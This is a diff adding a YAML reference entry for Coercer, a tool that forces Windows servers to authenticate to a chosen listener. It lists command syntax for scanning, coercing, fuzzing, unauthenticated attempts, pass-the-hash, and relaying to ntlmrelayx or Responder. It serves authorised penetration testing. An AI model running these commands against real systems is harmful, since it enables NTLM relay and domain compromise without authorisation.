@@ -1,0 +1,77 @@
+name: coercer
+aliases:
+  - Coercer.py
+category: active-directory
+homepage: https://github.com/p0dalirius/Coercer
+description: >-
+  Makes a Windows server authenticate to an arbitrary machine by calling its
+  remote procedure calls. It has three modes: scan to find exposed RPC
+  functions, coerce to trigger one deliberately, and fuzz to try many paths
+  during research.
+notes: >-
+  The listener address must be reachable from the target, and UNC paths are
+  randomised by default so repeated attempts are not served from the client's
+  cache. Only test systems you are authorised to assess.
+commands:
+  - name: Scan
+    syntax: coercer scan -t <dc-ip> -u <username> -p <password> -l <listener-ip>
+    description: >-
+      Lists the SMB pipes that are open on the target and reports which known
+      RPC functions can be coerced on it.
+    tags: [enumeration, rpc, scan]
+  - name: Coerce
+    syntax: coercer coerce -t <dc-ip> -u <username> -p <password> -l <listener-ip>
+    description: >-
+      Calls the vulnerable RPC functions one by one so the target
+      authenticates to the listener, for example to feed ntlmrelayx or
+      Responder.
+    tags: [rpc, relay, ntlm]
+    notes: >-
+      This triggers authentication against a host you control; only run it
+      against systems you are authorised to test.
+  - name: Fuzz
+    syntax: coercer fuzz -t <dc-ip> -u <username> -p <password> -l <listener-ip>
+    description: Tries many random UNC paths against the RPC functions, which is for research rather than assessment.
+    tags: [rpc, research]
+  - name: Target list
+    syntax: coercer scan -f <path> -l <listener-ip>
+    description: Runs the scan against many targets read from a file instead of a single machine.
+    tags: [enumeration, rpc]
+  - name: Unauthenticated
+    syntax: coercer coerce -t <dc-ip> -l <listener-ip> --no-pass
+    description: >-
+      Tries to coerce the target without credentials, which succeeds on hosts
+      that expose the RPC pipes to anonymous callers.
+    tags: [rpc, anonymous]
+  - name: Filter by method
+    syntax: coercer coerce -t <dc-ip> -u <username> -p <password> -l <listener-ip> --filter-method-name <name>
+    description: >-
+      Restricts the run to a single RPC method, or narrow by protocol with
+      --filter-protocol-name and by pipe with --filter-pipe-name.
+    tags: [rpc, filtering]
+  - name: Attempt delay
+    syntax: coercer coerce -t <dc-ip> -u <username> -p <password> -l <listener-ip> --delay <seconds>
+    description: Waits between attempts so the target is not overwhelmed.
+    tags: [rpc, performance]
+  - name: Pass-the-hash
+    syntax: coercer coerce -t <dc-ip> -u <username> -p <password> -l <listener-ip> --hashes <lmhash>:<nthash>
+    description: Authenticates with an NTLM hash, with the LM part optionally left empty.
+    tags: [credentials, pass-the-hash]
+  - name: Domain controller
+    syntax: coercer coerce -t <dc-ip> -u <username> -p <password> -d <domain> --dc-ip <dc-ip> -l <listener-ip>
+    description: >-
+      Sets the domain and the domain controller used for lookups when the
+      target name alone is not enough to find one.
+    tags: [kerberos, rpc]
+  - name: Custom ports
+    syntax: coercer coerce -t <dc-ip> -u <username> -p <password> -l <listener-ip> --http-port <port> --smb-port <port>
+    description: Changes the ports the listener uses; they default to 80 for HTTP and 445 for SMB.
+    tags: [rpc, listener]
+  - name: Verbose output
+    syntax: coercer scan -t <dc-ip> -u <username> -p <password> -l <listener-ip> -v
+    description: Prints each attempt as it happens instead of only the final result.
+    tags: [output]
+  - name: Help
+    syntax: coercer <mode> -h
+    description: Lists the options for the scan, coerce and fuzz modes.
+    tags: [help, reference]
